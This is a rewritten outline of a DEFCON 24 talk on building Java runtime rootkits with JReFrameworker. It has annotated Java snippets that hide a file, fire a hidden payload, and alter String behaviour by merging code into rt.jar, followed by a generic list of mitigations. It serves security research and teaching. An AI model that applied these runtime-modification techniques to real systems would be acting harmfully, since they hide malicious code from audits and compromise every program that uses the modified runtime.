# Developing Managed Code Rootkits for the Java Runtime Environment

## Presentation Details
- **Event:** DEFCON 24
- **Date:** August 6th, 2016
- **Presenter:** Benjamin Holland (daedared)
- **Website:** [ben-holland.com](http://ben-holland.com)

## Agenda
1. Introduction
2. Background
3. JReFrameworker
4. Modules
5. Mitigations
6. Q&A

## Introduction
- **Title:** Developing Managed Code Rootkits for the Java Runtime Environment
- **Presenter:** Benjamin Holland (daedared)
- **Education and Experience:**
  - B.S. in Computer Engineering (2005 - 2010)
  - Worked at Wabtec Railway Electronics, Ames Lab, Rockwell Collins
  - B.S. in Computer Science (2010 - 2011)
  - M.S. in Computer Engineering and Information Assurance (2010 - 2012)
  - MITRE
  - Iowa State University Research (2012 - 2015) on DARPA Automated Program Analysis for Cybersecurity (APAC) Program
  - PhD in Computer Engineering (2015 - present)
  - DARPA Space/Time Analysis for Cybersecurity (STAC) Program

## Background
- **Java Runtime Environment (JRE):** 
  - The JRE is a software layer that runs Java applications.
  - It includes the Java Virtual Machine (JVM), core libraries, and other components.

### Managed Code Rootkits (MCRs)
- **Definition:** Post-exploitation activity requiring root/administrator privileges.
- **Location:** `C:\Program Files\Java\...\lib\rt.jar`
- **Impact:** Compromises every program using the modified runtime.
- **Advantages:**
  - Out of sight, out of mind.
  - Code reviews/audits typically do not audit runtimes.
  - May be overlooked by forensic investigators.
  - Platform independence.
  - Runtimes are fully featured with object-oriented programming, standard libraries, and low-level APIs.

### Pioneering Work
- **Erez Metula (DEFCON 17):**
  - Explored implications of MCRs.
  - Developed "ReFrameworker" tool to modify .NET runtimes.
  - Used XML modules to define manipulation tasks.
  - Utilized an assembler/disassembler pair for modifications.
  - Generated deployment scripts.

## JReFrameworker
- **Goal:** Support MCRs for the Java Runtime Environment.
- **Features:**
  - Minimal prerequisite user knowledge.
  - No need for bytecode or intermediate language knowledge.
  - Simple development cycle (developing, debugging, deploying).
  - Strives for portability (Write Once, Exploit Everywhere).

### JReFrameworker Details
- **Development:**
  - Write rootkits in Java source code.
  - Modification behaviors defined with code annotations.
  - Develop and debug in Eclipse IDE.
  - Exploit "modules" are Eclipse Java projects.
  - Exportable payload droppers.
  - Bytecode injections computed on the fly.
- **Availability:**
  - Free and open-source (MIT License).
  - GitHub: [github.com/JReFrameworker](https://github.com/JReFrameworker)

### Example: Hello World Revisited
```java
@MergeType
public class BackwardsPrintStream extends java.io.PrintStream {
    @MergeMethod
    @Override
    public void println(String str) {
        StringBuilder sb = new StringBuilder(str);
        super.println(sb.reverse().toString());
    }
}
```

### Annotation Types
- **Types and Usage:**
  - `@MergeType`: Specifies a type to merge.
  - `@MergeMethod`: Specifies a method to merge.
  - `@DefineField`: Defines a field.
  - `@DefineFieldFinality`: Sets finality of a field.
  - `@DefineFieldVisibility`: Sets visibility of a field.

## Modules
- **Hidden File Example:**
  ```java
  @MergeType
  public class HiddenFile extends java.io.File {
      @MergeMethod
      @Override
      public boolean exists() {
          if (isFile() && getName().equals("secretFile")) {
              return false;
          } else {
              return super.exists();
          }
      }
  }
  ```

- **Beetlejuice Example:**
  ```java
  @MergeType
  public class BeetlejuicePS extends java.io.PrintStream {
      @DefineField
      private int beetlejuice;

      @MergeMethod
      public void println(String str) {
          StackTraceElement[] st = new Exception().getStackTrace();
          for (StackTraceElement element : st) {
              if (element.getMethodName().equals("beetlejuice")) {
                  if (++beetlejuice == 3) i.Main.main(new String[]{});
                  super.println(str);
              }
          }
      }
  }

  public class Test {
      static class TimBurton {}
      public static void main(String[] args) {
          TimBurton timBurton = new TimBurton();
          beetlejuice(timBurton);
          beetlejuice(timBurton);
          beetlejuice(timBurton);
      }

      private static void beetlejuice(TimBurton timBurton) {
          System.out.println(timBurton.toString());
      }
  }
  ```

- **Payload Behavior:**
  - The “`i.Main.main(new String[]);`” invokes Mocha DOOM.
  - Port of DOOM shareware to pure Java.
  - GitHub: [github.com/AXDOOMER/mochadoom](https://github.com/AXDOOMER/mochadoom)
  - Payload behaviors can depend on the state or structure of the client program.

### Mutable Strings
- **Example:**
  ```java
  public static void main(String[] args) {
      String demand = "sacrifice";
      demand.replace("sacrifice", "puppy");
      System.out.println("Satan demands a " + demand + "!");
  }
  ```
  - Immutable: `demand = "sacrifice"`
  - Mutable: `demand = "puppy"`

- **Modification:**
  ```java
  @DefineTypeFinality(finality = false)
  @DefineFieldFinality(field = "value", finality = false)
  @DefineFieldVisibility(field = "value", visibility = "protected")
  @MergeType
  public class MutableString extends java.lang.String {
      @MergeMethod
      public String replace(CharSequence s1, CharSequence s2) {
          String result = super.replace(s1, s2);
          // Update the value
          value = result.toCharArray();
          return result;
      }
  }
  ```

## Mitigations
- **Best Practices:**
  - Regularly update and patch the JRE.
  - Use application whitelisting.
  - Conduct regular security audits.
  - Employ intrusion detection and prevention systems.
  - Educate developers about secure coding practices.

## Q&A
- **Questions and Answers:**
  - Open floor for questions and discussions.

---

This optimized version of the text provides a clear, professional, and structured presentation of the topic, making it easier to follow and understand.